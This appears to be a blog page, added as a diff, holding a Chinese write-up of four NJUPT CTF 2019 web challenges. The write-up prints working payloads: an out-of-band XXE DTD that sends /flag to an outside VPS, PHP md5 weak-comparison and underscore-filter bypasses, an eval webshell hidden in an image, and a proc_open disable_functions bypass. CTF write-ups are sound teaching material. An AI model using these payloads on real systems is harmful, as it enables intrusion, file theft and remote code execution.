@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.2">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.2">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.2" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.2">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。1.Fake XML cookbook 测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下">
+<meta name="keywords" content="web,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NJUPT CTF 2019 web部分writeup">
+<meta property="og:url" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;11&#x2F;24&#x2F;NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup&#x2F;index.html">
+<meta property="og:site_name" content="LiM&#39;s blog">
+<meta property="og:description" content="题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。1.Fake XML cookbook 测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-24T11:31:36.939Z">
+<meta name="twitter:card" content="summary">
+  <link rel="canonical" href="https://li1m.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>NJUPT CTF 2019 web部分writeup | LiM's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LiM's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-friends">
+      
+    
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-paw"></i>friends</a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://Li1M.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LiM">
+      <meta itemprop="description" content="念念不忘，必有回响">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LiM's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            NJUPT CTF 2019 web部分writeup
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-11-24 17:12:47 / Modified: 19:31:36" itemprop="dateCreated datePublished" datetime="2019-11-24T17:12:47+08:00">2019-11-24</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              
+              <span>4.6k</span>
+            </span>
+          
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              
+              <span>4 mins.</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>题目挺好玩的，很多不会，慢慢写还是有点思路的，两天写了四个web题，学到了很多新知识。</p><p>1.Fake XML cookbook </p><p>测试了一下，没有回显，所以进行参数实体的注入，在vps上放一个xml文件，让它加载，文件内容如下</p><a id="more"></a>
+
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://47.103.62.94:8080/?content=%file;'&gt;"&gt; %payload;</span><br></pre></td></tr></table></figure>
+
+<p>因为题目提示了flag is in /flag，所以构造请求的xml内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span> &lt;!DOCTYPE test[ &lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=../../../flag"</span>&gt; &lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.103.62.94:8080/evil.xml"</span>&gt; %dtd; %send; ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">  &lt;username&gt;<span class="number">1</span>&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;<span class="number">1</span>&lt;/password&gt;</span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>![1574587789404](NJUPT CTF 2019 web部分writeup/1574587789404.png)</p>
+<p>最后把content的内容base64解码即是flag</p>
+<p>2.easyphp</p>
+<p>是一个函数绕过题，挺好玩的，</p>
+<p>1st</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'23333333'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以给num传23333%0a就可以绕过%0a是换行的意思</p>
+<p>2nd</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>弱类型比较，当两个字符串以0e开头且全为数字时，==会判断他们相等，返回bool(true)，如</p>
+<p>![1574588638162](NJUPT CTF 2019 web部分writeup/1574588638162.png)</p>
+<p>所以就有思路啦，需要$string_1是数字，$string_1和$string_2的md5值不等，但把$string_1和$string_2进行md5算法后的值’cxhp’替换为’0123’后，$a==$b，所以我们可以找出数字，md5算法后的值为0e或ce开头，且内容全为数字或’cxhp’，写个脚本跑了一下跑出一个数字，两个字符满足要求，脚本如下，然后让str1=2120624&amp;str2=0yFCJ即可绕过第二步。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0yFCJ	0dmRZ	2120624</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">dic = <span class="string">'0123456789qwertyuiopASDFGHJKLzxcvbnmQWERTYUIOPasdfghjklZXCVBNM'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(key)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(key.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> dic:</span><br><span class="line">                    f=a + b + c + d + e</span><br><span class="line">                    T = md5(f)</span><br><span class="line">                    T = T.replace(<span class="string">'c'</span>, <span class="string">'0'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'x'</span>, <span class="string">'1'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'h'</span>, <span class="string">'2'</span>)</span><br><span class="line">                    T = T.replace(<span class="string">'p'</span>, <span class="string">'3'</span>)</span><br><span class="line">                    <span class="keyword">if</span>((T)[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span> <span class="keyword">and</span> (T)[<span class="number">3</span>:].isdigit()):</span><br><span class="line">                        print(f)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">import hashlib</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def md5(key):</span></span><br><span class="line"><span class="string">    m = hashlib.md5()</span></span><br><span class="line"><span class="string">    m.update(key.encode('utf-8'))</span></span><br><span class="line"><span class="string">    return m.hexdigest()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1000000000):</span></span><br><span class="line"><span class="string">    T = md5(str(i))</span></span><br><span class="line"><span class="string">    T = T.replace('c', '0')</span></span><br><span class="line"><span class="string">    T = T.replace('x', '1')</span></span><br><span class="line"><span class="string">    T = T.replace('h', '2')</span></span><br><span class="line"><span class="string">    T = T.replace('p', '3')</span></span><br><span class="line"><span class="string">    if ((T)[0:2] == '0e' and (T)[3:].isdigit()):</span></span><br><span class="line"><span class="string">        print(i)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>3rd</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($cmd) &gt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) === <span class="number">0</span> &amp;&amp; substr_count($query, <span class="string">'%5f'</span>) === <span class="number">0</span> )&#123;</span><br><span class="line">    $arr = explode(<span class="string">' '</span>, $cmd);</span><br><span class="line">    <span class="keyword">if</span>($arr[<span class="number">0</span>] !== <span class="string">'ls'</span> || $arr[<span class="number">0</span>] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count($cmd, <span class="string">'cat'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个是要让请求的字符串中不能含_和%5f(%5f为_的url编码)，但又要对q_w_q传值。。。开始想了很久没有思路，问了大佬，他说_可以用.来代替，没想到这样也可以学到了学到了，所以对q.w.q传值即可，然后简单啦令q.w.q=more *.<em>就可以啦，\</em>是通配符，more以全屏幕的方式按页显示文本文件的内容 </p>
+<p>最终完整payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60005/?num=23333%0a&amp;str1=2120624&amp;str2=0yFCJ&amp;q.w.q=more *.*</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>3.Upload your Shell</p>
+<p>看源码，发现了这个./index.php?action=imgs.html</p>
+<p>点进去看了一下，就是上传点，有文件类型检测，做一个图片马，copy 1.jpg/b+2.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)，然后发现不能有&lt;?，这个之前考过，这样写就可以啦</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功后给了个地址，action包含这个地址就可以啦，最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60002/index.php?action=/var/www/html/upload-imgs/ed8c5de065c6151959b08babc2521a15/Th1s_is_a_fl4g.jpg</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>4.hacker_backdoor</p>
+<p>这个题目也是绕过，waf ban了所有函数和eval，assert，但是可以用字符串拼接绕过，这个题也学到了很多知识，原来eval也可以执行一段代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='php'.'info';%0a$a();&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>先看一下phpinfo()的disable_function，发现ban了很多函数还包括scandir，readfile，file_get_contents这样的函数（这里没仔细看，其实它放了一个命令执行函数proc_open）后面会发现这个问题，先不说，进行常规步骤，我是找替代scandir，readfile这样的函数，发现了glob函数和highlight_file函数可以使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='var_'.'dump';%0a$b='gl'.'ob';%0a$c='../../../*';%0a$a($b($c));&amp;useful=index.php		//遍历目录</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$a='highl'.'ight_f'.'ile';%0a$c='../../../readflag';%0a$a($c);&amp;useful=index.php		//读取内容</span></span><br></pre></td></tr></table></figure>
+
+<p>本以为这样读flag就结束了，可是它竟然读不了。。。后来看到了readflag就知道是要用这个读啦，盲猜readflag的内容是cat /flag，所以想办法执行readflag就行了，返回去看disable_functions，ban了那么多函数，以为命令执行函数早被禁完了，但是最终发现没有ban proc_open函数，所以用它执行readflag命令，最终payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这里涉及挺多函数的，等过几天把做题经常遇到的函数总结一下。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
+            
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" rel="next" title="upload-libs通关笔记">
+                  <i class="fa fa-chevron-left"></i> upload-libs通关笔记
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LiM</p>
+  <div class="site-description" itemprop="description">念念不忘，必有回响</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiM</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    
+    <span title="Symbols count total">23k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    
+    <span title="Reading time total">21 mins.</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">
+      
+    Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
+<script src="/js/schemes/pisces.js?v=7.4.2"></script>
+<script src="/js/next-boot.js?v=7.4.2"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.2"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
